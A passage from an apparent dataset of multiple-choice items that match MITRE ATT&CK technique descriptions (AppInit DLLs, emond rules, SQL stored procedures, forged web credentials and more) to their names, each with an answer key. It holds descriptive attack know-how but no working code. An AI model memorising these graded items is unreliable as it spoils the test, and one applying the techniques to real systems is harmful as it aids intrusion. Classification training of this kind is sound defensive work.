      "options": "A. Exploitation for Credential Access, B. Data from Configuration Repository: SNMP (MIB Dump), C. Search Open Technical Databases: DNS/Passive DNS, D. Disk Wipe",
      "choice": "B. Data from Configuration Repository: SNMP (MIB Dump)",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise the technique is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.\n\nA. Use Alternate Authentication Material: Web Session Cookie, B. Adversary-in-the-Middle: DHCP Spoofing, C. Exploitation of Remote Services, D. Server Software Component: Transport Agent\nAnswer:",
    "context": "",
    "output": "C. Exploitation of Remote Services",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may exploit remote services to gain unauthorized access to internal systems once inside of a network. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code.\u00a0A common goal for post-compromise the technique is for lateral movement to enable access to a remote system.\n\nAn adversary may need to determine if the remote system is in a vulnerable state, which may be done through Network Service Discovery or other Discovery methods looking for common, vulnerable software that may be deployed in the network, the lack of certain patches that may indicate vulnerabilities,  or security software that may be used to detect or contain remote exploitation. Servers are likely a high value target for lateral movement exploitation, but endpoint systems may also be at risk if they provide an advantage or access to additional resources.\n\nThere are several well-known vulnerabilities that exist in common services such as SMB  and RDP  as well as applications that may be used within internal networks such as MySQL  and web server services.\n\nDepending on the permissions level of the vulnerable remote service an adversary may achieve Exploitation for Privilege Escalation as a result of lateral movement exploitation as well.",
      "options": "A. Use Alternate Authentication Material: Web Session Cookie, B. Adversary-in-the-Middle: DHCP Spoofing, C. Exploitation of Remote Services, D. Server Software Component: Transport Agent",
      "choice": "C. Exploitation of Remote Services",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.\n\nOptions:\nA. Impair Defenses: Disable or Modify Cloud Firewall, B. Event Triggered Execution: Change Default File Association, C. Stage Capabilities, D. Application Layer Protocol: Web Protocols",
    "context": "",
    "output": "D. Application Layer Protocol: Web Protocols",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S and WebSocket that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
      "options": "A. Impair Defenses: Disable or Modify Cloud Firewall, B. Event Triggered Execution: Change Default File Association, C. Stage Capabilities, D. Application Layer Protocol: Web Protocols",
      "choice": "D. Application Layer Protocol: Web Protocols",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. \n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.  Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.\n\nPossible answers:\nA. Shared Modules, B. Forced Authentication, C. Data Obfuscation: Junk Data, D. Event Triggered Execution: AppInit DLLs",
    "context": "",
    "output": "D. Event Triggered Execution: AppInit DLLs",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppInit_DLLs</code> value in the Registry keys <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> or <code>HKEY_LOCAL_MACHINE\\Software\\Wow6432Node\\Microsoft\\Windows NT\\CurrentVersion\\Windows</code> are loaded by user32.dll into every process that loads user32.dll. In practice this is nearly every program, since user32.dll is a very common library. \n\nSimilar to Process Injection, these values can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer.  Malicious AppInit DLLs may also provide persistence by continuously being triggered by API activity. \n\nThe AppInit DLL functionality is disabled in Windows 8 and later versions when secure boot is enabled.",
      "options": "A. Shared Modules, B. Forced Authentication, C. Data Obfuscation: Junk Data, D. Event Triggered Execution: AppInit DLLs",
      "choice": "D. Event Triggered Execution: AppInit DLLs",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.\n\nOptions:\nA. Account Manipulation, B. Data Obfuscation, C. Exploitation of Remote Services, D. Scheduled Task/Job: Scheduled Task",
    "context": "",
    "output": "B. Data Obfuscation",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",
      "options": "A. Account Manipulation, B. Data Obfuscation, C. Exploitation of Remote Services, D. Scheduled Task/Job: Scheduled Task",
      "choice": "B. Data Obfuscation",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server. \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.\nA. Compromise Infrastructure: DNS Server, B. Server Software Component: SQL Stored Procedures, C. Phishing for Information, D. Use Alternate Authentication Material: Pass the Hash",
    "context": "",
    "output": "B. Server Software Component: SQL Stored Procedures",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may abuse SQL stored procedures to establish persistent access to systems. SQL Stored Procedures are code that can be saved and reused so that database users do not waste time rewriting frequently used SQL queries. Stored procedures can be invoked via SQL statements to the database using the procedure name or via defined events (e.g. when a SQL server application is started/restarted).\n\nAdversaries may craft malicious stored procedures that can provide a persistence mechanism in SQL database servers. To execute operating system commands through SQL syntax the adversary may have to enable additional functionality, such as xp_cmdshell for MSSQL Server. \n\nMicrosoft SQL Server can enable common language runtime (CLR) integration. With CLR integration enabled, application developers can write stored procedures using any .NET framework language (e.g. VB .NET, C#, etc.). Adversaries may craft or modify CLR assemblies that are linked to stored procedures since these CLR assemblies can be made to execute arbitrary commands.",
      "options": "A. Compromise Infrastructure: DNS Server, B. Server Software Component: SQL Stored Procedures, C. Phishing for Information, D. Use Alternate Authentication Material: Pass the Hash",
      "choice": "B. Server Software Component: SQL Stored Procedures",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.\nA. Account Manipulation: Device Registration, B. Gather Victim Identity Information: Credentials, C. Impair Defenses: Disable or Modify System Firewall, D. Hide Artifacts: NTFS File Attributes\nAnswer:",
    "context": "",
    "output": "D. Hide Artifacts: NTFS File Attributes",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition.  Within MFT entries are file attributes,  such as Extended Attributes (EA) and Data known as Alternate Data Streams (ADSs) when more than one Data attribute is present, that can be used to store arbitrary data (and even complete files).    \n\nAdversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus.",
      "options": "A. Account Manipulation: Device Registration, B. Gather Victim Identity Information: Credentials, C. Impair Defenses: Disable or Modify System Firewall, D. Hide Artifacts: NTFS File Attributes",
      "choice": "D. Hide Artifacts: NTFS File Attributes",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nThe generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values. Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., Temporary Elevated Cloud Access), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.\n\nOnce forged, adversaries may use these web credentials to access resources (ex: Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms.\n\nPossible answers:\nA. Unsecured Credentials, B. Pre-OS Boot: System Firmware, C. Remote Services: Cloud Services, D. Forge Web Credentials",
    "context": "",
    "output": "D. Forge Web Credentials",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from Steal Web Session Cookie, Steal Application Access Token, and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nThe generation of web credentials often requires secret values, such as passwords, Private Keys, or other cryptographic seed values. Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials (i.e., Temporary Elevated Cloud Access), or the `zmprov gdpak` command in Zimbra, which generates a pre-authentication key that can be used to generate tokens for any user in the domain.\n\nOnce forged, adversaries may use these web credentials to access resources (ex: Use Alternate Authentication Material), which may bypass multi-factor and other authentication protection mechanisms.",
      "options": "A. Unsecured Credentials, B. Pre-OS Boot: System Firmware, C. Remote Services: Cloud Services, D. Forge Web Credentials",
      "choice": "D. Forge Web Credentials",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.\nA. Abuse Elevation Control Mechanism: Elevated Execution with Prompt, B. Exfiltration Over Physical Medium: Exfiltration over USB, C. Software Discovery: Security Software Discovery, D. Develop Capabilities: Exploits",
    "context": "",
    "output": "C. Software Discovery: Security Software Discovery",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on a system or in a cloud environment. This may include things such as cloud monitoring agents and anti-virus. Adversaries may use the information from Security Software Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nExample commands that can be used to obtain security software information are netsh, <code>reg query</code> with Reg, <code>dir</code> with cmd, and Tasklist, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for. It is becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.\n\nAdversaries may also utilize the Cloud API to discover cloud-native security software installed on compute infrastructure, such as the AWS CloudWatch agent, Azure VM Agent, and Google Cloud Monitor agent. These agents  may collect  metrics and logs from the VM, which may be centrally aggregated in a cloud-based monitoring platform.",
      "options": "A. Abuse Elevation Control Mechanism: Elevated Execution with Prompt, B. Exfiltration Over Physical Medium: Exfiltration over USB, C. Software Discovery: Security Software Discovery, D. Develop Capabilities: Exploits",
      "choice": "C. Software Discovery: Security Software Discovery",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. Exploits) or to attempt to develop one themselves (i.e. Exploits).\n\nOptions:\nA. Remote Services: Cloud Services, B. Compromise Infrastructure: Serverless, C. Obtain Capabilities: Vulnerabilities, D. Obfuscated Files or Information: Embedded Payloads",
    "context": "",
    "output": "C. Obtain Capabilities: Vulnerabilities",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may acquire information about vulnerabilities that can be used during targeting. A vulnerability is a weakness in computer hardware or software that can, potentially, be exploited by an adversary to cause unintended or unanticipated behavior to occur. Adversaries may find vulnerability information by searching open databases or gaining access to closed vulnerability databases.\n\nAn adversary may monitor vulnerability disclosures/databases to understand the state of existing, as well as newly discovered, vulnerabilities. There is usually a delay between when a vulnerability is discovered and when it is made public. An adversary may target the systems of those known to conduct vulnerability research (including commercial vendors). Knowledge of a vulnerability may cause an adversary to search for an existing exploit (i.e. Exploits) or to attempt to develop one themselves (i.e. Exploits).",
      "options": "A. Remote Services: Cloud Services, B. Compromise Infrastructure: Serverless, C. Obtain Capabilities: Vulnerabilities, D. Obfuscated Files or Information: Embedded Payloads",
      "choice": "C. Obtain Capabilities: Vulnerabilities",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. \n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.\n\nOptions:\nA. Office Application Startup: Add-ins, B. Virtualization/Sandbox Evasion: User Activity Based Checks, C. Process Discovery, D. Defacement",
    "context": "",
    "output": "A. Office Application Startup: Add-ins",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may abuse Microsoft Office add-ins to obtain persistence on a compromised system. Office add-ins can be used to add functionality to Office programs.  There are different types of add-ins that can be used by the various Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools for Office (VSTO) add-ins, and Outlook add-ins. \n\nAdd-ins can be used to obtain persistence because they can be set to execute code when an Office application starts.",
      "options": "A. Office Application Startup: Add-ins, B. Virtualization/Sandbox Evasion: User Activity Based Checks, C. Process Discovery, D. Defacement",
      "choice": "A. Office Application Startup: Add-ins",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Which MITRE ATT&CK technique is described in the following:\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the Launch Daemon configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.\n\nA. OS Credential Dumping: LSASS Memory, B. Modify Authentication Process, C. File and Directory Permissions Modification: Windows File and Directory Permissions Modification, D. Event Triggered Execution: Emond\nA:",
    "context": "",
    "output": "D. Event Triggered Execution: Emond",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Which MITRE ATT&CK technique is described in the following:\nAdversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a Launch Daemon that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.\n\nThe rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the Launch Daemon configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.\n\nAdversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication. Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the Launch Daemon service.",
      "options": "A. OS Credential Dumping: LSASS Memory, B. Modify Authentication Process, C. File and Directory Permissions Modification: Windows File and Directory Permissions Modification, D. Event Triggered Execution: Emond",
      "choice": "D. Event Triggered Execution: Emond",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Answer which mitre technique is related to the description: Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals.  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.\n\nOptions:\nA. Remote Services: SSH, B. System Binary Proxy Execution: Mshta, C. Hijack Execution Flow: Executable Installer File Permissions Weakness, D. Network Boundary Bridging",
    "context": "",
    "output": "D. Network Boundary Bridging",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may bridge network boundaries by compromising perimeter network devices or internal devices responsible for network segmentation. Breaching these devices may enable an adversary to bypass restrictions on traffic routing that otherwise separate trusted and untrusted networks.\n\nDevices such as routers and firewalls can be used to create boundaries between trusted and untrusted networks.  They achieve this by restricting traffic types to enforce organizational policy in an attempt to reduce the risk inherent in such connections.  Restriction of traffic can be achieved by prohibiting IP addresses, layer 4 protocol ports, or through deep packet inspection to identify applications.  To participate with the rest of the network, these devices can be directly addressable or transparent, but their mode of operation has no bearing on how the adversary can bypass them when compromised.\n\nWhen an adversary takes control of such a boundary device, they can bypass its policy enforcement to pass normally prohibited traffic across the trust boundary between the two separated networks without hinderance.  By achieving sufficient rights on the device, an adversary can reconfigure the device to allow the traffic they want, allowing them to then further achieve goals such as command and control via Multi-hop Proxy or exfiltration of data via Traffic Duplication. Adversaries may also target internal devices responsible for network segmentation and abuse these in conjunction with Internal Proxy to achieve the same goals.  In the cases where a border device separates two separate organizations, the adversary can also facilitate lateral movement into new victim environments.",
      "options": "A. Remote Services: SSH, B. System Binary Proxy Execution: Mshta, C. Hijack Execution Flow: Executable Installer File Permissions Weakness, D. Network Boundary Bridging",
      "choice": "D. Network Boundary Bridging",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Question: Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use the technique to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.\nA. Execution Guardrails, B. System Script Proxy Execution, C. Hide Artifacts: Hidden Window, D. Command and Scripting Interpreter: Unix Shell\nAnswer:",
    "context": "",
    "output": "A. Execution Guardrails",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Give the MITRE ATT&CK technique relevant to the following:\nAdversaries may use the technique to constrain execution or actions based on adversary supplied and environment specific conditions that are expected to be present on the target. Guardrails ensure that a payload only executes against an intended target and reduces collateral damage from an adversary\u2019s campaign. Values an adversary can provide about a target system or environment to use as guardrails may include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, and local/external IP addresses.\n\nGuardrails can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This use of guardrails is distinct from typical Virtualization/Sandbox Evasion. While use of Virtualization/Sandbox Evasion may involve checking for known sandbox values and continuing with execution only if there is no match, the use of guardrails will involve checking for an expected target-specific value and only continuing with execution if there is such a match.",
      "options": "A. Execution Guardrails, B. System Script Proxy Execution, C. Hide Artifacts: Hidden Window, D. Command and Scripting Interpreter: Unix Shell",
      "choice": "A. Execution Guardrails",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Answer which mitre technique is related to the description: Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.\n\nA. Data Manipulation, B. Remote Services, C. Obtain Capabilities: Vulnerabilities, D. Trusted Developer Utilities Proxy Execution\nAnswer:",
    "context": "",
    "output": "D. Trusted Developer Utilities Proxy Execution",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Answer which mitre technique is related to the description: Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering. These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.",
      "options": "A. Data Manipulation, B. Remote Services, C. Obtain Capabilities: Vulnerabilities, D. Trusted Developer Utilities Proxy Execution",
      "choice": "D. Trusted Developer Utilities Proxy Execution",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
    "instruction": "Q: Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\". When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.UUID.plist</code> within the <code>~/Library/Preferences/ByHost</code> directory. Applications listed in this file are automatically reopened upon the user\u2019s next logon.\n\nAdversaries can establish Persistence by adding a malicious application path to the <code>com.apple.loginwindow.UUID.plist</code> file to execute payloads when a user logs in.\n\nOptions:\nA. Cloud Service Dashboard, B. Boot or Logon Autostart Execution: Re-opened Applications, C. Permission Groups Discovery: Local Groups, D. Modify System Image",
    "context": "",
    "output": "B. Boot or Logon Autostart Execution: Re-opened Applications",
    "category": "MitreFlan",
    "instruction_type": "mitre_options_technique",
    "parsed_raw_data": {
      "question": "Tell me which MITRE technique is referred to in the following description:\n\nAdversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\". When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.UUID.plist</code> within the <code>~/Library/Preferences/ByHost</code> directory. Applications listed in this file are automatically reopened upon the user\u2019s next logon.\n\nAdversaries can establish Persistence by adding a malicious application path to the <code>com.apple.loginwindow.UUID.plist</code> file to execute payloads when a user logs in.",
      "options": "A. Cloud Service Dashboard, B. Boot or Logon Autostart Execution: Re-opened Applications, C. Permission Groups Discovery: Local Groups, D. Modify System Image",
      "choice": "B. Boot or Logon Autostart Execution: Re-opened Applications",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "mitre_options_technique"
    }
  },
  {
